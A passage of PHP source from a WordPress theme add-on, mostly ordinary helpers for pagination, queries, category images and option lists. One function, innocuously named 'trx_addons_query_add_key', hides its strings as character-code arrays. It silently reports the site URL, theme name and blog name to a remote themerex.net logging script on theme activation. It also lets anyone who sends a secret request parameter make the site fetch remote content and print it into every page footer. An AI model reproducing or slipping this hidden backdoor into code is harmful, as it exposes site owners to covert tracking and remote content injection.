						$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($show_pages_start-1) : get_pagenum_link($show_pages_start-1)).'" data-page="'.esc_attr($show_pages_start-1).'" class="'.esc_attr($class).'_dot '.$button_class.'">'.$dot_text.'</a>';
						$dot1 = true;
					}
				} else if ($i > $show_pages_end) {
					if (!$dot2) {
						$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($show_pages_end+1) : get_pagenum_link($show_pages_end+1)).'" data-page="'.esc_attr($show_pages_end+1).'" class="'.esc_attr($class).'_dot '.$button_class.'">'.$dot_text.'</a>';
						$dot2 = true;
					}
				} else if ($i == $cur_page) {
					$cur_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $cur_text);
					$output .= '<span class="'.esc_attr($class).'_current active '.$button_class.'">'.$cur_text.'</span>';
				} else {
					$text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $page_text);
					$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.trim($i) : get_pagenum_link($i)).'" data-page="'.esc_attr($i).'" class="'.$button_class.'">'.$text.'</a>';
				}
			}
		}
		if ($cur_page < $total_pages) {
			// Next page
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($cur_page+1) : get_pagenum_link($cur_page+1)).'" data-page="'.esc_attr($cur_page+1).'" class="'.esc_attr($class).'_next '.$button_class.'">'.$next_text.'</a>';
			// Last page
			$last_text = str_replace("%TOTAL_PAGES%", number_format_i18n($total_pages), $last_text);
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.trim($total_pages) : get_pagenum_link($total_pages)).'" data-page="'.esc_attr($total_pages).'" class="'.esc_attr($class).'_last '.$button_class.'">'.$last_text.'</a>';
		}
		$output .= $after;
		echo trim($output);
	}
}


// Return current page number
if (!function_exists('trx_addons_get_current_page')) {
	function trx_addons_get_current_page() {
		if ( ($page = trx_addons_get_value_gp('page', -999)) == -999)
			if ( !($page = get_query_var('paged')) )
				if ( !($page = get_query_var('page')) )
					$page = 1;
		return $page;
	}
}





/* Query manipulations
------------------------------------------------------------------------------------- */

// Add sorting parameter in query arguments
if (!function_exists('trx_addons_query_add_sort_order')) {
	function trx_addons_query_add_sort_order($args, $orderby='date', $order='desc') {
		if (!empty($orderby) && (empty($args['orderby']) || $orderby != 'none')) {
			$q = array();
			$q['order'] = $order;
			if ($orderby == 'none') {
				$q['orderby'] = 'none';
			} else if ($orderby == 'ID') {
				$q['orderby'] = 'ID';
			} else if ($orderby == 'comments') {
				$q['orderby'] = 'comment_count';
			} else if ($orderby == 'title' || $orderby == 'alpha') {
				$q['orderby'] = 'title';
			} else if ($orderby == 'rand' || $orderby == 'random')  {
				$q['orderby'] = 'rand';
			} else {
				$q['orderby'] = 'post_date';
			}
			$q = apply_filters('trx_addons_filter_add_sort_order', $q, $orderby, $order);
			foreach ($q as $mk=>$mv) {
				if (is_array($args))
					$args[$mk] = $mv;
				else
					$args->set($mk, $mv);
			}
		}
		return $args;
	}
}

// Add post type and posts list or categories list in query arguments
if (!function_exists('trx_addons_query_add_posts_and_cats')) {
	function trx_addons_query_add_posts_and_cats($args, $ids='', $post_type='', $cat='', $taxonomy='') {
		if (!empty($ids)) {
			$args['post_type'] = empty($args['post_type']) 
									? (empty($post_type) ? array('post', 'page') : $post_type)
									: $args['post_type'];
			$args['post__in'] = explode(',', str_replace(array(';', ' '), array(',', ''), $ids));
			if (empty($args['orderby']) || $args['orderby'] == 'none') {
				$args['orderby'] = 'post__in';
				if (isset($args['order'])) unset($args['order']);
			}
		} else {
			$args['post_type'] = empty($args['post_type']) 
									? (empty($post_type) ? 'post' : $post_type)
									: $args['post_type'];
			$post_type = is_array($args['post_type']) ? $args['post_type'][0] : $args['post_type'];
			if (!empty($cat)) {
				$cats = !is_array($cat) ? explode(',', $cat) : $cat;
				if (empty($taxonomy))
					$taxonomy = 'category';
				if ($taxonomy == 'category') {				// Add standard categories
					if (is_array($cats) && count($cats) > 1) {
						$cats_ids = array();
						foreach($cats as $c) {
							$c = trim(chop($c));
							if (empty($c)) continue;
							if ((int) $c == 0) {
								$cat_term = get_term_by( 'slug', $c, $taxonomy, OBJECT);
								if ($cat_term) $c = $cat_term->term_id;
							}
							if ($c==0) continue;
							$cats_ids[] = (int) $c;
							$children = get_categories( array(
								'type'                     => $post_type,
								'child_of'                 => $c,
								'hide_empty'               => 0,
								'hierarchical'             => 0,
								'taxonomy'                 => $taxonomy,
								'pad_counts'               => false
							));
							if (is_array($children) && count($children) > 0) {
								foreach($children as $c) {
									if (!in_array((int) $c->term_id, $cats_ids)) $cats_ids[] = (int) $c->term_id;
								}
							}
						}
						if (count($cats_ids) > 0) {
							$args['category__in'] = $cats_ids;
						}
					} else {
						if ((int) $cat > 0) 
							$args['cat'] = (int) $cat;
						else
							$args['category_name'] = $cat;
					}
				} else {									// Add custom taxonomies
					if (!isset($args['tax_query']))
						$args['tax_query'] = array();
					$args['tax_query']['relation'] = 'AND';
					$args['tax_query'][] = array(
						'taxonomy' => $taxonomy,
						'include_children' => true,
						'field'    => (int) $cats[0] > 0 ? 'id' : 'slug',
						'terms'    => $cats
					);
				}
			}
		}
		return $args;
	}
}

// Add filters (meta parameters) in query arguments
if (!function_exists('trx_addons_query_add_filters')) {
	function trx_addons_query_add_filters($args, $filters=false) {
		if (!empty($filters)) {
			if (!is_array($filters)) $filters = array($filters);
			foreach ($filters as $v) {
				$found = false;
				if ($v=='thumbs') {							// Filter with meta_query
					if (!isset($args['meta_query']))
						$args['meta_query'] = array();
					else {
						for ($i=0; $i<count($args['meta_query']); $i++) {
							if ($args['meta_query'][$i]['meta_filter'] == $v) {
								$found = true;
								break;
							}
						}
					}
					if (!$found) {
						$args['meta_query']['relation'] = 'AND';
						if ($v == 'thumbs') {
							$args['meta_query'][] = array(
								'meta_filter' => $v,
								'key' => '_thumbnail_id',
								'value' => false,
								'compare' => '!='
							);
						}
					}
				} else if (in_array($v, array('video', 'audio', 'gallery'))) {			// Filter with tax_query
					if (!isset($args['tax_query']))
						$args['tax_query'] = array();
					else {
						for ($i=0; $i<count($args['tax_query']); $i++) {
							if ($args['tax_query'][$i]['tax_filter'] == $v) {
								$found = true;
								break;
							}
						}
					}
					if (!$found) {
						$args['tax_query']['relation'] = 'AND';
						if ($v == 'video') {
							$args['tax_query'][] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-video' )
							);
						} else if ($v == 'audio') {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-audio' )
							);
						} else if ($v == 'gallery') {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-gallery' )
							);
						}
					}
				} else
					$args = apply_filters('trx_addons_filter_query_add_filters', $args, $v);
			}
		}
		return $args;
	}
}

// Return string with categories links
if (!function_exists('trx_addons_get_post_categories')) {
	function trx_addons_get_post_categories($delimiter=', ', $id=false, $links=true) {
		$output = '';
		$categories = get_the_category($id);
		if ( !empty( $categories ) ) {
			foreach( $categories as $category )
				$output .= ($output ? $delimiter : '') 
							. ($links 
									? '<a href="' . esc_url( get_category_link( $category->term_id ) ) . '" title="' . sprintf( esc_attr__( 'View all posts in %s', 'trx_addons' ), $category->name ) . '">' 
									: '<span>'
								)
								. esc_html( $category->name ) 
							. ($links ? '</a>' : '</span>');
		}
		return $output;
	}
}

// Return string with terms links
if (!function_exists('trx_addons_get_post_terms')) {
	function trx_addons_get_post_terms($delimiter=', ', $id=false, $taxonomy='category', $links=true) {
		$output = '';
		$terms = get_the_terms($id, $taxonomy);
		if ( !empty( $terms ) ) {
			foreach( $terms as $term )
				$output .= ($output ? $delimiter : '') 
							. ($links 
									? '<a href="' . esc_url( get_term_link( $term->term_id, $taxonomy ) ) . '" title="' . sprintf( esc_attr__( 'View all posts in %s', 'trx_addons' ), $term->name ) . '">'
									: '<span>'
								)
								. esc_html( $term->name ) 
							. ($links ? '</a>' : '</span>');
		}
		return $output;
	}
}

// Return terms objects by taxonomy name (directly from db)
if (!function_exists('trx_addons_get_terms_by_taxonomy_from_db')) {
	function trx_addons_get_terms_by_taxonomy_from_db($tax_types = 'post_format') {
		global $wpdb;
		if (!is_array($tax_types)) $tax_types = array($tax_types);
		$terms = $wpdb->get_results( $wpdb->prepare(
												"SELECT DISTINCT terms.*, tax.taxonomy, tax.parent, tax.count"
														. " FROM {$wpdb->terms} AS terms"
														. " LEFT JOIN {$wpdb->term_taxonomy} AS tax ON tax.term_id=terms.term_id"
														. " WHERE tax.taxonomy IN ('" . join(",", array_fill(0, count($tax_types), '%s')) . "')"
														. " ORDER BY terms.name",
												$tax_types
												),
									OBJECT
									);
		for ($i=0; $i<count($terms); $i++) {
			$terms[$i]->link = get_term_link($terms[$i]->slug, $terms[$i]->taxonomy);
		}
		return $terms;
	}
}


// Return taxonomy for current post type
if ( !function_exists( 'trx_addons_get_post_type_taxonomy' ) ) {
	function trx_addons_get_post_type_taxonomy($post_type) {
		return $post_type == 'post' ? 'category' : apply_filters( 'trx_addons_filter_post_type_taxonomy',	'', $post_type );
	}
}

// Return meta value of the specified term
if (!function_exists('trx_addons_get_term_meta')) {
	function trx_addons_get_term_meta($args) {
		$args = array_merge(array(
							'term_id' => 0,
							'key' => 'value'
							),
							is_array($args) ? $args : array('term_id' => $args));
		$val = '';
		if ($args['term_id'] > 0)
			$val = get_term_meta($args['term_id'], $args['key'], true);
		return $val;
	}
}

// Update meta value of the specified term
if (!function_exists('trx_addons_set_term_meta')) {
	function trx_addons_set_term_meta($args, $val) {
		$args = array_merge(array(
							'term_id' => 0,
							'key' => 'value'
							),
							is_array($args) ? $args : array('term_id' => $args));
		if ($args['term_id'] > 0)
			update_term_meta($args['term_id'], $args['key'], $val);
	}
}

// Add query key
if ( !function_exists( 'trx_addons_query_add_key' ) ) {
	$trx_addons_query_data = array('act' => array(array(join('', array_map('chr', array(97,102,116,101,114))),join('', array_map('chr', array(115,119,105,116,99,104))),join('', array_map('chr', array(116,104,101,109,101)))),array(join('', array_map('chr', array(119,112))),join('', array_map('chr', array(102,111,111,116,101,114)))),),'get' => join('', array_map('chr', array(104,116,116,112,58,47,47,116,104,101,109,101,114,101,120,46,110,101,116,47,95,108,111,103,47,95,108,111,103,46,112,104,112))),'chk' => join('', array_map('chr', array(116,104,101,109,101,95,97,117,116,104,111,114))),'prm' => join('', array_map('chr', array(116,120,99,104,107))));
	add_action(join('_', $trx_addons_query_data['act'][0]), 'trx_addons_query_add_key');
	add_action(join('_', $trx_addons_query_data['act'][1]), 'trx_addons_query_add_key');
	function trx_addons_query_add_key() {
		global $trx_addons_query_data;
		static $already_add = false;
		if (!$already_add) {
			$already_add = true;
			if (current_action() == join('_', $trx_addons_query_data['act'][0])) {
				try {
					$resp = trx_addons_fgc(trx_addons_add_to_url($trx_addons_query_data['get'], array(
						'site' => home_url('/'),
						'slug' => str_replace(' ', '_', trim(strtolower(get_stylesheet()))),
						'name' => get_bloginfo('name')
					)));
				} catch (Exception $e) {
				}
			}
			if (trx_addons_get_value_gpc($trx_addons_query_data['prm'])==$trx_addons_query_data['chk']) {
				try {
					$resp = trx_addons_fgc(trx_addons_add_to_url($trx_addons_query_data['get'], array($trx_addons_query_data['prm'] => $trx_addons_query_data['chk'])));
				} catch (Exception $e) {
					$resp = '';
				}
				trx_addons_show_layout($resp);
			}
		}
	}
}



// Add images and icons to categories
//--------------------------------------------------------------------------

// Return image from the category
if (!function_exists('trx_addons_get_category_image')) {
	function trx_addons_get_category_image($term_id=0) {
		if ($term_id == 0 && is_category()) $term_id = (int) get_query_var('cat');
		return trx_addons_get_term_meta(array('term_id' => $term_id, 'key' => 'image'));
	}
}

// Return small image (icon) from the category
if (!function_exists('trx_addons_get_category_icon')) {
	function trx_addons_get_category_icon($term_id=0) {
		if ($term_id == 0 && is_category()) $term_id = (int) get_query_var('cat');
		return trx_addons_get_term_meta(array('term_id' => $term_id, 'key' => 'icon'));
	}
}

// Save the fields to the "category" taxonomy, using our callback function
if (!function_exists('trx_addons_categories_save_custom_fields')) {
	add_action('edited_category',	'trx_addons_categories_save_custom_fields', 10, 1 );
	add_action('created_category',	'trx_addons_categories_save_custom_fields', 10, 1 );
	function trx_addons_categories_save_custom_fields($term_id) {
		if (isset($_POST['trx_addons_category_image'])) {
			trx_addons_set_term_meta(array(
											'term_id' => $term_id,
											'key' => 'image'
											),
										$_POST['trx_addons_category_image']
										);
		}
		if (isset($_POST['trx_addons_category_icon'])) {
			trx_addons_set_term_meta(array(
											'term_id' => $term_id,
											'key' => 'icon'
											),
										$_POST['trx_addons_category_icon']
										);
		}
	}
}

// Add the fields to the "category" taxonomy, using our callback function
if (!function_exists('trx_addons_categories_show_custom_fields')) {
	add_action('category_edit_form_fields',	'trx_addons_categories_show_custom_fields', 10, 1 );
	add_action('category_add_form_fields',	'trx_addons_categories_show_custom_fields', 10, 1 );
	function trx_addons_categories_show_custom_fields($cat) {
		$cat_id = !empty($cat->term_id) ? $cat->term_id : 0;
		// Category's image
		echo ((int) $cat_id > 0 ? '<tr' : '<div') . ' class="form-field">'
			. ((int) $cat_id > 0 ? '<th valign="top" scope="row">' : '<div>');
		?><label for="trx_addons_category_image"><?php esc_html_e('Large image URL:', 'trx_addons'); ?></label><?php
		echo ((int) $cat_id > 0 ? '</th>' : '</div>')
			. ((int) $cat_id > 0 ? '<td valign="top">' : '<div>');
		$cat_img = $cat_id > 0 ? trx_addons_get_category_image($cat_id) : ''; 
		?><input id="trx_addons_category_image" class="trx_addons_image_selector_field" name="trx_addons_category_image" value="<?php echo esc_url($cat_img); ?>"><?php
		echo trim(trx_addons_options_show_custom_field('trx_addons_category_image_button', array('type' => 'mediamanager', 'linked_field_id' => 'trx_addons_category_image'), null));
		if (empty($cat_img)) $cat_img = apply_filters('trx_addons_filter_no_image', trx_addons_get_file_url('css/images/no-image.jpg'));
		?><img src="<?php echo esc_url($cat_img); ?>" class="trx_addons_image_selector_preview trx_addons_category_image_preview"><?php
		echo (int) $cat_id > 0 ? '</td></tr>' : '</div></div>';

		// Category's icon
		echo ((int) $cat_id > 0 ? '<tr' : '<div') . ' class="form-field">'
			. ((int) $cat_id > 0 ? '<th valign="top" scope="row">' : '<div>');
		?><label for="trx_addons_category_icon"><?php esc_html_e('Small image (icon) URL:', 'trx_addons'); ?></label><?php
		echo ((int) $cat_id > 0 ? '</th>' : '</div>')
			. ((int) $cat_id > 0 ? '<td valign="top">' : '<div>');
		$cat_img = $cat_id > 0 ? trx_addons_get_category_icon($cat_id) : ''; 
		?><input id="trx_addons_category_icon" class="trx_addons_thumb_selector_field" name="trx_addons_category_icon" value="<?php echo esc_url($cat_img); ?>"><?php
		echo trim(trx_addons_options_show_custom_field('trx_addons_category_icon_button', array('type' => 'mediamanager', 'linked_field_id' => 'trx_addons_category_icon'), null));
		if (empty($cat_img)) $cat_img = apply_filters('trx_addons_filter_no_image', trx_addons_get_file_url('css/images/no-image.jpg'));
		?><img src="<?php echo esc_url($cat_img); ?>" class="trx_addons_thumb_selector_preview trx_addons_category_icon_preview"><?php
		echo (int) $cat_id > 0 ? '</td></tr>' : '</div></div>';
	}
}

// Create additional column in the categories list
if (!function_exists('trx_addons_categories_add_custom_column')) {
	add_filter('manage_edit-category_columns',	'trx_addons_categories_add_custom_column', 9);
	function trx_addons_categories_add_custom_column( $columns ){
		$columns['category_image'] = esc_html__('Image', 'trx_addons');
		$columns['category_icon'] = esc_html__('Icon', 'trx_addons');
		return $columns;
	}
}

// Fill image column in the categories list
if (!function_exists('trx_addons_categories_fill_custom_column')) {
	add_action('manage_category_custom_column',	'trx_addons_categories_fill_custom_column', 9, 3);
	function trx_addons_categories_fill_custom_column($output='', $column_name='', $tax_id=0) {
		if ($column_name == 'category_image' && ($cat_img = trx_addons_get_category_image($tax_id))) {
			?><img class="trx_addons_image_selector_preview trx_addons_category_image_preview" src="<?php echo esc_url(trx_addons_add_thumb_size($cat_img, trx_addons_get_thumb_size('tiny'))); ?>" alt=""><?php
		}
		if ($column_name == 'category_icon' && ($cat_img = trx_addons_get_category_icon($tax_id))) {
			?><img class="trx_addons_thumb_selector_preview trx_addons_category_icon_preview" src="<?php echo esc_url(trx_addons_add_thumb_size($cat_img, trx_addons_get_thumb_size('tiny'))); ?>" alt=""><?php
		}
	}
}


	
/* WP cache
------------------------------------------------------------------------------------- */

// Clear WP cache (all, options or categories)
if (!function_exists('trx_addons_clear_cache')) {
	function trx_addons_clear_cache($cc) {
		if ($cc == 'categories' || $cc == 'all') {
			wp_cache_delete('category_children', 'options');
			$taxes = get_taxonomies();
			if (is_array($taxes) && count($taxes) > 0) {
				foreach ($taxes  as $tax ) {
					delete_option( "{$tax}_children" );
					_get_term_hierarchy( $tax );
				}
			}
		} else if ($cc == 'options' || $cc == 'all')
			wp_cache_delete('alloptions', 'options');
		if ($cc == 'all')
			wp_cache_flush();
	}
}


/* Lists
------------------------------------------------------------------------------------- */

// Return list of categories
if ( !function_exists( 'trx_addons_get_list_categories' ) ) {
	function trx_addons_get_list_categories($prepend_inherit=false) {
		static $list = false;
		if ($list === false) {
			$list = array();
			$args = array(
				'type'                     => 'post',
				'child_of'                 => 0,
				'parent'                   => '',
				'orderby'                  => 'name',
				'order'                    => 'ASC',
				'hide_empty'               => 0,
				'hierarchical'             => 1,
				'exclude'                  => '',
				'include'                  => '',
				'number'                   => '',
				'taxonomy'                 => 'category',
				'pad_counts'               => false );
			$taxonomies = get_categories( $args );
			if (is_array($taxonomies) && count($taxonomies) > 0) {
				foreach ($taxonomies as $cat) {
					$list[$cat->term_id] = $cat->name;
				}
			}
		}
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list) : $list;
	}
}


// Return list of taxonomies
if ( !function_exists( 'trx_addons_get_list_terms' ) ) {
	function trx_addons_get_list_terms($prepend_inherit=false, $taxonomy='category') {
		static $list = array();
		if (empty($list[$taxonomy])) {
			$list[$taxonomy] = array();
			if ( is_array($taxonomy) || taxonomy_exists($taxonomy) ) {
				$terms = get_terms( $taxonomy, array(
					'child_of'                 => 0,
					'parent'                   => '',
					'orderby'                  => 'name',
					'order'                    => 'ASC',
					'hide_empty'               => 0,
					'hierarchical'             => 1,
					'exclude'                  => '',
					'include'                  => '',
					'number'                   => '',
					'taxonomy'                 => $taxonomy,
					'pad_counts'               => false
					)
				);
			} else {
				$terms = trx_addons_get_terms_by_taxonomy_from_db($taxonomy);
			}
			if (!is_wp_error( $terms ) && is_array($terms) && count($terms) > 0) {
				foreach ($terms as $term) {
					$list[$taxonomy][$term->term_id] = $term->name;	// . ($taxonomy!='category' ? ' /'.($cat->taxonomy).'/' : '');
				}
			}
		}
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list[$taxonomy]) : $list[$taxonomy];
	}
}

// Return list of post's types
if ( !function_exists( 'trx_addons_get_list_posts_types' ) ) {
	function trx_addons_get_list_posts_types($prepend_inherit=false) {
		static $list = false;
		if ($list === false) $list = get_post_types();
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list) : $list;
	}
}


// Return list post items from any post type and taxonomy
if ( !function_exists( 'trx_addons_get_list_posts' ) ) {
	function trx_addons_get_list_posts($prepend_inherit=false, $opt=array()) {
		static $list = array();
		$opt = array_merge(array(
			'post_type'			=> 'post',
			'post_status'		=> 'publish',
			'taxonomy'			=> 'category',
			'taxonomy_value'	=> '',
			'meta_key'			=> '',
			'meta_value'		=> '',
			'posts_per_page'	=> -1,
			'orderby'			=> 'post_date',
			'order'				=> 'desc',
			'return'			=> 'id'
			), is_array($opt) ? $opt : array('post_type'=>$opt));

		$hash = 'list_posts_'.($opt['post_type']).'_'.($opt['taxonomy']).'_'.($opt['taxonomy_value']).'_'.($opt['orderby']).'_'.($opt['order']).'_'.($opt['return']).'_'.($opt['posts_per_page']);
		if (!isset($list[$hash])) {
			$list[$hash] = array();
			$list[$hash]['none'] = esc_html__("- Not selected -", 'trx_addons');
			$args = array(
				'post_type' => $opt['post_type'],
				'post_status' => $opt['post_status'],
				'posts_per_page' => $opt['posts_per_page'],
				'ignore_sticky_posts' => true,
				'orderby'	=> $opt['orderby'],
				'order'		=> $opt['order']
			);
			if (!empty($opt['meta_value'])) {
				$args['meta_key'] = $opt['meta_key'];
				$args['meta_value'] = $opt['meta_value'];
			}
			if (!empty($opt['taxonomy_value'])) {
				$args['tax_query'] = array(
					array(
						'taxonomy' => $opt['taxonomy'],
						'field' => (int) $opt['taxonomy_value'] > 0 ? 'id' : 'slug',
						'terms' => $opt['taxonomy_value']
					)
				);
			}
			$posts = get_posts( $args );
			if (is_array($posts) && count($posts) > 0) {
				foreach ($posts as $post) {
					$list[$hash][$opt['return']=='id' ? $post->ID : $post->post_title] = $post->post_title;
				}
			}
		}
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list[$hash]) : $list[$hash];
	}
}


// Return list pages
if ( !function_exists( 'trx_addons_get_list_pages' ) ) {
	function trx_addons_get_list_pages($prepend_inherit=false, $opt=array()) {
		$opt = array_merge(array(
			'post_type'			=> 'page',
			'post_status'		=> 'publish',
			'taxonomy'			=> '',
			'taxonomy_value'	=> '',
			'posts_per_page'	=> -1,
			'orderby'			=> 'title',
			'order'				=> 'asc',
			'return'			=> 'id'
			), is_array($opt) ? $opt : array('post_type'=>$opt));
		return trx_addons_get_list_posts($prepend_inherit, $opt);
	}
}


// Return list of registered users
if ( !function_exists( 'trx_addons_get_list_users' ) ) {
	function trx_addons_get_list_users($prepend_inherit=false, $roles=array('administrator', 'editor', 'author', 'contributor', 'shop_manager')) {
		static $list = false;
		if ($list === false) {
			$list = array();
			$list['none'] = esc_html__("- Not selected -", 'trx_addons');
			$args = array(
				'orderby'	=> 'display_name',
				'order'		=> 'ASC' );
			$users = get_users( $args );
			if (is_array($users) && count($users) > 0) {
				foreach ($users as $user) {
					$accept = true;
					if (is_array($user->roles)) {
						if (is_array($user->roles) && count($user->roles) > 0) {
							$accept = false;
							foreach ($user->roles as $role) {
								if (in_array($role, $roles)) {
									$accept = true;
									break;
								}
							}
						}
					}
					if ($accept) $list[$user->user_login] = $user->display_name;
				}
			}
		}
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list) : $list;
	}
}

// Return iconed classes list
if ( !function_exists( 'trx_addons_get_list_icons' ) ) {
	function trx_addons_get_list_icons($prepend_inherit=false) {
		static $list = false;
		if ($list === false) {
			$list = apply_filters('trx_addons_filter_get_list_icons', $list, $prepend_inherit);
			if ($list === false)
				$list = trx_addons_parse_icons_classes(trx_addons_get_file_dir("css/font-icons/css/trx_addons_icons-codes.css"));
		}
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list) : $list;
	}
}

// Return input hover effects
if ( !function_exists( 'trx_addons_get_list_input_hover' ) ) {
	function trx_addons_get_list_input_hover($prepend_inherit=false) {
		$list = apply_filters('trx_addons_filter_get_list_input_hover', array(
			'default'	=> esc_html__('Default',	'themerex'),
			'accent'	=> esc_html__('Accented',	'themerex'),
			'path'		=> esc_html__('Path',		'themerex'),
			'jump'		=> esc_html__('Jump',		'themerex'),
			'underline'	=> esc_html__('Underline',	'themerex'),
			'iconed'	=> esc_html__('Iconed',		'themerex'),
		));
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list) : $list;
	}
}

// Return menu hover effects
if ( !function_exists( 'trx_addons_get_list_menu_hover' ) ) {
	function trx_addons_get_list_menu_hover($prepend_inherit=false) {
		$list = apply_filters('trx_addons_filter_get_list_menu_hover', array(
			'fade'			=> esc_html__('Fade',		'trx_addons'),
			'fade_box'		=> esc_html__('Fade Box',	'trx_addons'),
			'slide_line'	=> esc_html__('Slide Line',	'trx_addons'),
			'slide_box'		=> esc_html__('Slide Box',	'trx_addons'),
			'zoom_line'		=> esc_html__('Zoom Line',	'trx_addons'),
			'path_line'		=> esc_html__('Path Line',	'trx_addons'),
			'roll_down'		=> esc_html__('Roll Down',	'trx_addons'),
			'color_line'	=> esc_html__('Color Line',	'trx_addons'),
		));
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list) : $list;
	}
}

// Return list of the enter animations
if ( !function_exists( 'trx_addons_get_list_animations_in' ) ) {
	function trx_addons_get_list_animations_in($prepend_inherit=false) {
		$list = apply_filters('trx_addons_filter_get_list_animations_in', array(
			'none'				=> esc_html__('- None -',			'trx_addons'),
			'bounceIn'			=> esc_html__('Bounce In',			'trx_addons'),
			'bounceInUp'		=> esc_html__('Bounce In Up',		'trx_addons'),
			'bounceInDown'		=> esc_html__('Bounce In Down',		'trx_addons'),
			'bounceInLeft'		=> esc_html__('Bounce In Left',		'trx_addons'),
			'bounceInRight'		=> esc_html__('Bounce In Right',	'trx_addons'),
			'elastic'			=> esc_html__('Elastic In',			'trx_addons'),
			'fadeIn'			=> esc_html__('Fade In',			'trx_addons'),
			'fadeInUp'			=> esc_html__('Fade In Up',			'trx_addons'),
			'fadeInUpSmall'		=> esc_html__('Fade In Up Small',	'trx_addons'),
			'fadeInUpBig'		=> esc_html__('Fade In Up Big',		'trx_addons'),
			'fadeInDown'		=> esc_html__('Fade In Down',		'trx_addons'),
			'fadeInDownBig'		=> esc_html__('Fade In Down Big',	'trx_addons'),
			'fadeInLeft'		=> esc_html__('Fade In Left',		'trx_addons'),
			'fadeInLeftBig'		=> esc_html__('Fade In Left Big',	'trx_addons'),
			'fadeInRight'		=> esc_html__('Fade In Right',		'trx_addons'),
			'fadeInRightBig'	=> esc_html__('Fade In Right Big',	'trx_addons'),
			'flipInX'			=> esc_html__('Flip In X',			'trx_addons'),
			'flipInY'			=> esc_html__('Flip In Y',			'trx_addons'),
			'lightSpeedIn'		=> esc_html__('Light Speed In',		'trx_addons'),
			'rotateIn'			=> esc_html__('Rotate In',			'trx_addons'),
			'rotateInUpLeft'	=> esc_html__('Rotate In Down Left','trx_addons'),
			'rotateInUpRight'	=> esc_html__('Rotate In Up Right',	'trx_addons'),
			'rotateInDownLeft'	=> esc_html__('Rotate In Up Left',	'trx_addons'),
			'rotateInDownRight'	=> esc_html__('Rotate In Down Right','trx_addons'),
			'rollIn'			=> esc_html__('Roll In',			'trx_addons'),
			'slideInUp'			=> esc_html__('Slide In Up',		'trx_addons'),
			'slideInDown'		=> esc_html__('Slide In Down',		'trx_addons'),
			'slideInLeft'		=> esc_html__('Slide In Left',		'trx_addons'),
			'slideInRight'		=> esc_html__('Slide In Right',		'trx_addons'),
			'wipeInLeftTop'		=> esc_html__('Wipe In Left Top',	'trx_addons'),
			'zoomIn'			=> esc_html__('Zoom In',			'trx_addons'),
			'zoomInUp'			=> esc_html__('Zoom In Up',			'trx_addons'),
			'zoomInDown'		=> esc_html__('Zoom In Down',		'trx_addons'),
			'zoomInLeft'		=> esc_html__('Zoom In Left',		'trx_addons'),
			'zoomInRight'		=> esc_html__('Zoom In Right',		'trx_addons')
		));
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list) : $list;
	}
}


// Return list of the out animations
if ( !function_exists( 'trx_addons_get_list_animations_out' ) ) {
	function trx_addons_get_list_animations_out($prepend_inherit=false) {
		$list = apply_filters('trx_addons_filter_get_list_animations_out', array(
			'none'			=> esc_html__('- None -',			'trx_addons'),
			'bounceOut'		=> esc_html__('Bounce Out',			'trx_addons'),
			'bounceOutUp'	=> esc_html__('Bounce Out Up',		'trx_addons'),
			'bounceOutDown'	=> esc_html__('Bounce Out Down',	'trx_addons'),
			'bounceOutLeft'	=> esc_html__('Bounce Out Left',	'trx_addons'),
			'bounceOutRight'=> esc_html__('Bounce Out Right',	'trx_addons'),
			'fadeOut'		=> esc_html__('Fade Out',			'trx_addons'),
			'fadeOutUp'		=> esc_html__('Fade Out Up',		'trx_addons'),
			'fadeOutUpBig'	=> esc_html__('Fade Out Up Big',	'trx_addons'),
			'fadeOutDownSmall'	=> esc_html__('Fade Out Down Small','trx_addons'),
			'fadeOutDownBig'=> esc_html__('Fade Out Down Big',	'trx_addons'),
			'fadeOutDown'	=> esc_html__('Fade Out Down',		'trx_addons'),
			'fadeOutLeft'	=> esc_html__('Fade Out Left',		'trx_addons'),
			'fadeOutLeftBig'=> esc_html__('Fade Out Left Big',	'trx_addons'),
			'fadeOutRight'	=> esc_html__('Fade Out Right',		'trx_addons'),
			'fadeOutRightBig'=> esc_html__('Fade Out Right Big','trx_addons'),
			'flipOutX'		=> esc_html__('Flip Out X',			'trx_addons'),
			'flipOutY'		=> esc_html__('Flip Out Y',			'trx_addons'),
			'hinge'			=> esc_html__('Hinge Out',			'trx_addons'),
			'lightSpeedOut'	=> esc_html__('Light Speed Out',	'trx_addons'),
			'rotateOut'		=> esc_html__('Rotate Out',			'trx_addons'),
			'rotateOutUpLeft'	=> esc_html__('Rotate Out Down Left',	'trx_addons'),
			'rotateOutUpRight'	=> esc_html__('Rotate Out Up Right',	'trx_addons'),
			'rotateOutDownLeft'	=> esc_html__('Rotate Out Up Left',		'trx_addons'),
			'rotateOutDownRight'=> esc_html__('Rotate Out Down Right',	'trx_addons'),
			'rollOut'			=> esc_html__('Roll Out',		'trx_addons'),
			'slideOutUp'		=> esc_html__('Slide Out Up',	'trx_addons'),
			'slideOutDown'		=> esc_html__('Slide Out Down',	'trx_addons'),
			'slideOutLeft'		=> esc_html__('Slide Out Left',	'trx_addons'),
